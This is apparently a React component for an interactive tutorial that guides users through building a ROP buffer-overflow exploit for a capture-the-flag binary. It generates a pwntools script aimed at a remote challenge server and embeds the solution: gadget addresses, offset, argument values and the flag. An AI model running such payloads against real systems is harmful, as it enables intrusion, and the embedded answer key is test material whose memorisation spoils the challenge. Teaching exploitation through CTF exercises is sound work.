import React, { useState, useEffect } from 'react';
import { Button } from "@/components/ui/button";
import { ArrowRight, ArrowLeft, Rocket, RefreshCw, Info } from 'lucide-react';
import GuidePlatformStep from '../exploit_builder_guide_steps/GuidePlatformStep';
import GuideOffsetStep from '../exploit_builder_guide_steps/GuideOffsetStep';
import GuideArgumentsStep from '../exploit_builder_guide_steps/GuideArgumentsStep';
import GuideGadgetsStep from '../exploit_builder_guide_steps/GuideGadgetsStep';
import GuideScriptReviewStep from '../exploit_builder_guide_steps/GuideScriptReviewStep';
import GuideSimulationStep from '../exploit_builder_guide_steps/GuideSimulationStep';

type Platform = 'local' | 'remote' | 'debug';
type Offset = 40 | 48 | 56 | 64;

interface GadgetDetail {
  id: string;
  address: string;
  instruction: string;
  tooltip: string;
}

const gadgetDetails: GadgetDetail[] = [
  { id: 'pop_rdi', address: '0x401199', instruction: 'pop rdi; ret', tooltip: 'Sets RDI (1st argument). Pops a value from the stack into RDI, then returns.' },
  { id: 'pop_rax', address: '0x4011a1', instruction: 'pop rax; ret', tooltip: 'Used to set RSI indirectly. Pops a value from the stack into RAX, then returns.' },
  { id: 'mov_rsi_rax', address: '0x40119b', instruction: 'mov rsi, rax; ret', tooltip: 'Transfers RAX to RSI. Moves the value from RAX into RSI, then returns.' },
  { id: 'pop_rdx', address: '0x40119f', instruction: 'pop rdx; ret', tooltip: 'Sets RDX (3rd argument). Pops a value from the stack into RDX, then returns.' },
  { id: 'call_surprise', address: '0x4011a6', instruction: 'call surprise_for_you', tooltip: 'Calls the target function `surprise_for_you` to get the flag.' },
];

const simulationSteps = [
  "[+] Connecting to 5.223.62.57:5001...",
  "[*] Sending crafted payload...",
  "[*] Buffer overflow triggered!",
  "✅ Here you go: ICTF25{e29ff023c2ad70c61a2554c31d4539acdecf143758abd44ff43c86444f046aed}",
  "[⚠️] Malicious activity pattern detected by system."
];

const incorrectSimulationSteps = [
  "[+] Connecting to selected target...",
  "[*] Sending crafted payload...",
  "[!] Exploit attempt failed. The program did not behave as expected.",
  "[*] Possible issues: Incorrect offset, wrong argument values, or missing/incorrect ROP gadgets.",
  "[*] Review your selections and try again."
];

interface ExploitBuilderGuideViewProps {
  onBackToMethods: () => void;
}

const ExploitBuilderGuideView: React.FC<ExploitBuilderGuideViewProps> = ({ onBackToMethods }) => {
  const [currentStep, setCurrentStep] = useState(1);
  const [platform, setPlatform] = useState<Platform>('remote');
  const [offset, setOffset] = useState<Offset | null>(null);
  const [argRdi, setArgRdi] = useState<string | null>(null);
  const [argRsi, setArgRsi] = useState<string | null>(null);
  const [argRdx, setArgRdx] = useState<string | null>(null);
  const [selectedGadgets, setSelectedGadgets] = useState<string[]>([]);

  const [simulationOutputLines, setSimulationOutputLines] = useState<string[]>([]);
  const [isSimulating, setIsSimulating] = useState(false);

  const commonButtonClass = "text-slate-100 border-sky-500 hover:bg-sky-700/50 hover:text-white";
  const primaryButtonClass = "bg-sky-600 hover:bg-sky-500 text-white";
  const successButtonClass = "bg-green-600 hover:bg-green-500 text-white";
  const destructiveButtonClass = "bg-red-600 hover:bg-red-500 text-white";

  const totalSteps = 6;

  const handleNextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(prev => prev + 1);
    }
  };

  const handlePrevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(prev => prev - 1);
      if (currentStep === totalSteps) { // If going back from simulation step
        setIsSimulating(false); 
        setSimulationOutputLines([]); 
      }
    } else {
      onBackToMethods();
    }
  };
  
  const handleRestartBuilder = () => {
    setCurrentStep(1);
    setPlatform('remote');
    setOffset(null);
    setArgRdi(null);
    setArgRsi(null);
    setArgRdx(null);
    setSelectedGadgets([]);
    setIsSimulating(false);
    setSimulationOutputLines([]);
  };

  const handleGadgetToggle = (gadgetId: string) => {
    setSelectedGadgets(prev =>
      prev.includes(gadgetId) ? prev.filter(g => g !== gadgetId) : [...prev, gadgetId]
    );
  };
  
  const isExploitConfigurationCorrect = () => {
    const requiredGadgetIds = ['pop_rdi', 'pop_rax', 'mov_rsi_rax', 'pop_rdx', 'call_surprise'];
    const allRequiredGadgetsSelected = requiredGadgetIds.every(id => selectedGadgets.includes(id));
    const noExtraGadgetsSelected = selectedGadgets.every(id => requiredGadgetIds.includes(id));

    return offset === 56 &&
           argRdi === '0xcafebabe' &&
           argRsi === '0xdeadbeef' &&
           argRdx === '0xc0ffee' &&
           allRequiredGadgetsSelected &&
           noExtraGadgetsSelected &&
           platform === 'remote';
  };

  useEffect(() => {
    if (currentStep === 6 && isSimulating) {
      const stepsToSimulate = isExploitConfigurationCorrect() ? simulationSteps : incorrectSimulationSteps;
      let i = 0;
      setSimulationOutputLines([]); 
      const interval = setInterval(() => {
        if (i < stepsToSimulate.length) {
          if (typeof stepsToSimulate[i] === 'string') {
            setSimulationOutputLines(prev => [...prev, stepsToSimulate[i]]);
          } else {
            console.error(`[ExploitBuilderGuideView] A step in simulation is not a string at index ${i}:`, stepsToSimulate[i]);
          }
          i++;
        } else {
          clearInterval(interval);
          // setIsSimulating(false); // Keep isSimulating true to show restart/back buttons
        }
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [currentStep, isSimulating, platform, offset, argRdi, argRsi, argRdx, selectedGadgets]);

  const getCodeSnippetForStep = () => {
    let code = `# Python (pwntools) code snippet\n\n`;
    switch (currentStep) {
      case 1:
        if (platform === 'remote') code += `from pwn import remote\np = remote('5.223.62.57', 5001)`;
        else if (platform === 'local') code += `from pwn import process\np = process('./ret2where')`;
        else code += `from pwn import gdb\np = gdb.debug('./ret2where', gdbscript='''\n  b main\n  continue\n''')`;
        break;
      case 2:
        code += `# Step 1 selection:\n`;
        if (platform === 'remote') code += `p = remote('5.223.62.57', 5001)\n\n`;
        else if (platform === 'local') code += `p = process('./ret2where')\n\n`;
        else code += `p = gdb.debug('./ret2where', gdbscript='...')\n\n`;
        if (offset !== null) code += `offset = ${offset}`;
        else code += `# Select an offset`;
        break;
      case 3:
        code += `# Step 1 & 2 selections:\n`;
        if (platform === 'remote') code += `p = remote('5.223.62.57', 5001)\n`;
        if (offset !== null) code += `offset = ${offset}\n\n`;
        code += `# Argument values for surprise_for_you():\n`;
        if (argRdi) code += `# RDI (1st arg) = ${argRdi}\n`;
        if (argRsi) code += `# RSI (2nd arg) = ${argRsi}\n`;
        if (argRdx) code += `# RDX (3rd arg) = ${argRdx}\n`;
        if (!argRdi && !argRsi && !argRdx) code += `# Select argument values`;
        break;
      case 4:
        code += `# Selected ROP Gadgets for the chain:\n`;
        code += `rop_chain = [\n`;
        if (selectedGadgets.includes('pop_rdi')) {
            code += `    ${gadgetDetails.find(g => g.id === 'pop_rdi')?.address}, # pop rdi; ret\n`;
            if (argRdi) code += `    ${argRdi}, # Value for RDI\n`;
            else code += `    # Choose value for RDI in Step 3\n`;
        }
        if (selectedGadgets.includes('pop_rax')) {
            code += `    ${gadgetDetails.find(g => g.id === 'pop_rax')?.address}, # pop rax; ret\n`;
            if (argRsi) code += `    ${argRsi}, # Value for RAX (to be moved to RSI)\n`;
             else code += `    # Choose value for RSI in Step 3\n`;
        }
        if (selectedGadgets.includes('mov_rsi_rax')) {
             code += `    ${gadgetDetails.find(g => g.id === 'mov_rsi_rax')?.address}, # mov rsi, rax; ret\n`;
        }
        if (selectedGadgets.includes('pop_rdx')) {
            code += `    ${gadgetDetails.find(g => g.id === 'pop_rdx')?.address}, # pop rdx; ret\n`;
            if (argRdx) code += `    ${argRdx}, # Value for RDX\n`;
            else code += `    # Choose value for RDX in Step 3\n`;
        }
        if (selectedGadgets.includes('call_surprise')) {
            code += `    ${gadgetDetails.find(g => g.id === 'call_surprise')?.address}, # call surprise_for_you\n`;
        }
        if (selectedGadgets.length === 0) code += `    # Select gadgets to build the ROP chain\n`;
        code += `]\n`;
        break;
      case 5:
      case 6:
        code = `from pwn import *\n\n`;
        if (platform === 'remote') code += `p = remote('5.223.62.57', 5001)\n`;
        else if (platform === 'local') code += `p = process('./ret2where')\n`;
        else code += `p = gdb.debug('./ret2where', gdbscript='...')\n`;
        code += `\noffset = ${offset || '# (select offset in Step 2)'}\n\n`;
        code += `rop_chain = [\n`;
        if (selectedGadgets.includes('pop_rdi') && gadgetDetails.find(g=>g.id === 'pop_rdi')) code += `    ${gadgetDetails.find(g=>g.id === 'pop_rdi')?.address},   # pop rdi; ret\n    ${argRdi || '# (select RDI in Step 3)'},\n`;
        if (selectedGadgets.includes('pop_rax') && gadgetDetails.find(g=>g.id === 'pop_rax')) code += `    ${gadgetDetails.find(g=>g.id === 'pop_rax')?.address},   # pop rax; ret\n    ${argRsi || '# (select RSI in Step 3)'}, # for RSI\n`;
        if (selectedGadgets.includes('mov_rsi_rax') && gadgetDetails.find(g=>g.id === 'mov_rsi_rax')) code += `    ${gadgetDetails.find(g=>g.id === 'mov_rsi_rax')?.address}, # mov rsi, rax; ret\n`;
        if (selectedGadgets.includes('pop_rdx') && gadgetDetails.find(g=>g.id === 'pop_rdx')) code += `    ${gadgetDetails.find(g=>g.id === 'pop_rdx')?.address},   # pop rdx; ret\n    ${argRdx || '# (select RDX in Step 3)'},\n`;
        if (selectedGadgets.includes('call_surprise') && gadgetDetails.find(g=>g.id === 'call_surprise')) code += `    ${gadgetDetails.find(g=>g.id === 'call_surprise')?.address}  # call surprise_for_you\n`;
        code += `]\n\n`;
        code += `payload = b'A' * (offset if isinstance(offset, int) else 0) # Ensure offset is int for multiplication\n`;
        code += `for addr_val in rop_chain:\n`;
        code += `    if isinstance(addr_val, str) and addr_val.startswith('0x'):\n`;
        code += `        payload += p64(int(addr_val, 16))\n`;
        code += `    elif isinstance(addr_val, int):\n`;
        code += `        payload += p64(addr_val)\n`;
        code += `    else:\n`;
        code += `        payload += p64(0) # Fallback for unselected/invalid values, or comment out\n\n`;
        code += `p.sendline(payload)\n`;
        code += `p.interactive()\n`;
        break;
      default:
        code = "# Select options in the current step to see the code update.";
    }
    return code;
  };
  
  const renderStepContent = () => {
    if (currentStep === 1) {
      return <GuidePlatformStep platform={platform} onPlatformChange={setPlatform} />;
    }
    if (currentStep === 2) {
      return <GuideOffsetStep offset={offset} onOffsetChange={setOffset} />;
    }
    if (currentStep === 3) {
      return (
        <GuideArgumentsStep
          argRdi={argRdi} onArgRdiChange={setArgRdi}
          argRsi={argRsi} onArgRsiChange={setArgRsi}
          argRdx={argRdx} onArgRdxChange={setArgRdx}
        />
      );
    }
    if (currentStep === 4) {
      return (
        <GuideGadgetsStep
          selectedGadgets={selectedGadgets}
          onGadgetToggle={handleGadgetToggle}
          gadgetDetails={gadgetDetails}
        />
      );
    }
    if (currentStep === 5) {
      return <GuideScriptReviewStep scriptContent={getCodeSnippetForStep()} />;
    }
    if (currentStep === 6) {
      return (
        <GuideSimulationStep
          simulationOutputLines={simulationOutputLines}
          isSimulating={isSimulating}
          isExploitConfigurationCorrect={isExploitConfigurationCorrect}
          simulationStepsLength={simulationSteps.length}
          incorrectSimulationStepsLength={incorrectSimulationSteps.length}
        />
      );
    }
    return null;
  };

  return (
    <div className="p-4 md:p-6 animate-fade-in">
      <h3 className="text-2xl font-semibold text-sky-300 mb-6 text-center">👣 Step-by-Step Malicious Exploit Builder</h3>
      
      <div className={`grid ${currentStep <= 4 ? 'md:grid-cols-2 gap-6' : 'grid-cols-1'} items-start`}>
        <div className={`bg-slate-700/30 p-4 rounded-lg ${currentStep > 4 ? 'col-span-2' : ''}`}>
            <div className="space-y-6">
                 {renderStepContent()}
            </div>
        </div>

        {currentStep <= 4 && (
          <div className="bg-slate-900 p-4 rounded-lg sticky top-20">
            <h4 className="text-md font-medium text-sky-400 mb-2">Live Code Preview (Python/pwntools)</h4>
            <pre className="text-slate-300 font-mono text-xs overflow-x-auto whitespace-pre-wrap max-h-[400px] min-h-[200px] bg-slate-800 p-2 rounded">
              {getCodeSnippetForStep()}
            </pre>
          </div>
        )}
      </div>

      <div className="mt-8 flex flex-col sm:flex-row justify-between items-center gap-3">
        <Button 
            onClick={handlePrevStep} 
            variant="outline"
            className={`text-slate-100 border-sky-500 hover:text-white 
                        ${currentStep === 1 
                            ? 'bg-slate-700 hover:bg-slate-600' 
                            : 'bg-slate-700/60 hover:bg-sky-700/50'
                        }`}
        >
          <ArrowLeft className="mr-1"/>
          {currentStep === 1 ? 'Back to Methods' : 'Previous Step'}
        </Button>
        
        {currentStep < totalSteps -1 && (
            <Button onClick={handleNextStep} className={primaryButtonClass}>
            Next Step <ArrowRight className="ml-1" />
            </Button>
        )}
        {currentStep === totalSteps - 1 && (
            <Button 
                onClick={() => { setIsSimulating(true); handleNextStep(); }} 
                className={successButtonClass}
            >
            Simulate Payload Execution <Rocket className="ml-2" />
            </Button>
        )}
        {currentStep === totalSteps && (
            <Button onClick={handleRestartBuilder} className={destructiveButtonClass}>
                <RefreshCw className="mr-1"/> Restart Exploit Builder
            </Button>
        )}
      </div>
    </div>
  );
};

export default ExploitBuilderGuideView;
